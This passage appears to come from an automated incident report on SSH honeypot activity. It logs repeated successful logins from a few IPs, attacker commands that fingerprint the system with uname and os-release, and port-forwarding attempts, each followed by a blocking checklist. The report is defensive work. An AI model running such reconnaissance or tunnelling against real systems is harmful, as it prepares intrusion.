| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:40:26` | `cowrie.session.connect` |
| `2026-07-28 21:40:27` | `cowrie.client.version` |
| `2026-07-28 21:40:27` | `cowrie.client.kex` |
| `2026-07-28 21:40:30` | `cowrie.login.success` |
| `2026-07-28 21:40:31` | `cowrie.session.params` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.success` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:31` | `cowrie.command.input` |
| `2026-07-28 21:40:32` | `cowrie.log.closed` |
| `2026-07-28 21:40:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ffff56b3b7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:41 |
| **Last Seen** | 2026-07-28 21:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:41:49` | `cowrie.session.connect` |
| `2026-07-28 21:41:49` | `cowrie.client.version` |
| `2026-07-28 21:41:49` | `cowrie.client.kex` |
| `2026-07-28 21:41:52` | `cowrie.login.success` |
| `2026-07-28 21:41:54` | `cowrie.session.params` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.success` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:54` | `cowrie.command.input` |
| `2026-07-28 21:41:55` | `cowrie.log.closed` |
| `2026-07-28 21:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a947cc4c24d4

| Field | Detail |
|---|---|
| **Source IP** | `61.145.163[.]164` |
| **First Seen** | 2026-07-28 21:43 |
| **Last Seen** | 2026-07-28 21:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:43:05` | `cowrie.session.connect` |
| `2026-07-28 21:43:06` | `cowrie.client.version` |
| `2026-07-28 21:43:06` | `cowrie.client.kex` |
| `2026-07-28 21:43:08` | `cowrie.login.success` |
| `2026-07-28 21:43:09` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.145.163[.]164` to AbuseIPDB if not already reported
- [ ] Block `61.145.163[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-251b9b509485

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:43 |
| **Last Seen** | 2026-07-28 21:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:43:11` | `cowrie.session.connect` |
| `2026-07-28 21:43:11` | `cowrie.client.version` |
| `2026-07-28 21:43:11` | `cowrie.client.kex` |
| `2026-07-28 21:43:14` | `cowrie.login.success` |
| `2026-07-28 21:43:15` | `cowrie.session.params` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.success` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:15` | `cowrie.command.input` |
| `2026-07-28 21:43:16` | `cowrie.log.closed` |
| `2026-07-28 21:43:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1eb6f42791a

| Field | Detail |
|---|---|
| **Source IP** | `103.83.23[.]169` |
| **First Seen** | 2026-07-28 21:43 |
| **Last Seen** | 2026-07-28 21:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:43:14` | `cowrie.session.connect` |
| `2026-07-28 21:43:14` | `cowrie.client.version` |
| `2026-07-28 21:43:14` | `cowrie.client.kex` |
| `2026-07-28 21:43:16` | `cowrie.login.success` |
| `2026-07-28 21:43:17` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:43:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.83.23[.]169` to AbuseIPDB if not already reported
- [ ] Block `103.83.23[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7ae548e2047

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:44 |
| **Last Seen** | 2026-07-28 21:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:44:31` | `cowrie.session.connect` |
| `2026-07-28 21:44:32` | `cowrie.client.version` |
| `2026-07-28 21:44:32` | `cowrie.client.kex` |
| `2026-07-28 21:44:34` | `cowrie.login.success` |
| `2026-07-28 21:44:37` | `cowrie.session.params` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.success` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.command.input` |
| `2026-07-28 21:44:37` | `cowrie.log.closed` |
| `2026-07-28 21:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04fe7d522d69

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:45 |
| **Last Seen** | 2026-07-28 21:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:45:52` | `cowrie.session.connect` |
| `2026-07-28 21:45:53` | `cowrie.client.version` |
| `2026-07-28 21:45:53` | `cowrie.client.kex` |
| `2026-07-28 21:45:55` | `cowrie.login.success` |
| `2026-07-28 21:45:56` | `cowrie.session.params` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.success` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:56` | `cowrie.command.input` |
| `2026-07-28 21:45:57` | `cowrie.log.closed` |
| `2026-07-28 21:45:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e2a2e6201df

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:47 |
| **Last Seen** | 2026-07-28 21:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:47:15` | `cowrie.session.connect` |
| `2026-07-28 21:47:16` | `cowrie.client.version` |
| `2026-07-28 21:47:16` | `cowrie.client.kex` |
| `2026-07-28 21:47:16` | `cowrie.login.success` |
| `2026-07-28 21:47:18` | `cowrie.session.params` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.success` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:18` | `cowrie.command.input` |
| `2026-07-28 21:47:19` | `cowrie.log.closed` |
| `2026-07-28 21:47:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91b944be346

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:48 |
| **Last Seen** | 2026-07-28 21:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:48:38` | `cowrie.session.connect` |
| `2026-07-28 21:48:38` | `cowrie.client.version` |
| `2026-07-28 21:48:38` | `cowrie.client.kex` |
| `2026-07-28 21:48:41` | `cowrie.login.success` |
| `2026-07-28 21:48:43` | `cowrie.session.params` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.success` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.command.input` |
| `2026-07-28 21:48:43` | `cowrie.log.closed` |
| `2026-07-28 21:48:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4977544458e

| Field | Detail |
|---|---|
| **Source IP** | `14.54.22[.]11` |
| **First Seen** | 2026-07-28 21:49 |
| **Last Seen** | 2026-07-28 21:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:49:40` | `cowrie.session.connect` |
| `2026-07-28 21:49:41` | `cowrie.client.version` |
| `2026-07-28 21:49:41` | `cowrie.client.kex` |
| `2026-07-28 21:49:44` | `cowrie.login.success` |
| `2026-07-28 21:49:44` | `cowrie.direct-tcpip.request` |
| `2026-07-28 21:49:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.54.22[.]11` to AbuseIPDB if not already reported
- [ ] Block `14.54.22[.]11` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6809c74ba33f

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:50 |
| **Last Seen** | 2026-07-28 21:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:50:03` | `cowrie.session.connect` |
| `2026-07-28 21:50:03` | `cowrie.client.version` |
| `2026-07-28 21:50:03` | `cowrie.client.kex` |
| `2026-07-28 21:50:06` | `cowrie.login.success` |
| `2026-07-28 21:50:07` | `cowrie.session.params` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.success` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:07` | `cowrie.command.input` |
| `2026-07-28 21:50:08` | `cowrie.log.closed` |
| `2026-07-28 21:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9532e3443cd9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:51 |
| **Last Seen** | 2026-07-28 21:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:51:28` | `cowrie.session.connect` |
| `2026-07-28 21:51:28` | `cowrie.client.version` |
| `2026-07-28 21:51:28` | `cowrie.client.kex` |
| `2026-07-28 21:51:30` | `cowrie.login.success` |
| `2026-07-28 21:51:32` | `cowrie.session.params` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.success` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.command.input` |
| `2026-07-28 21:51:32` | `cowrie.log.closed` |
| `2026-07-28 21:51:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df62fdf8ed3e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:52 |
| **Last Seen** | 2026-07-28 21:53 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:52:55` | `cowrie.session.connect` |
| `2026-07-28 21:52:56` | `cowrie.client.version` |
| `2026-07-28 21:52:56` | `cowrie.client.kex` |
| `2026-07-28 21:52:58` | `cowrie.login.success` |
| `2026-07-28 21:52:59` | `cowrie.session.params` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.success` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:52:59` | `cowrie.command.input` |
| `2026-07-28 21:53:00` | `cowrie.log.closed` |
| `2026-07-28 21:53:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-261c3f48de5b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:54 |
| **Last Seen** | 2026-07-28 21:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:54:20` | `cowrie.session.connect` |
| `2026-07-28 21:54:20` | `cowrie.client.version` |
| `2026-07-28 21:54:20` | `cowrie.client.kex` |
| `2026-07-28 21:54:22` | `cowrie.login.success` |
| `2026-07-28 21:54:24` | `cowrie.session.params` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.success` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
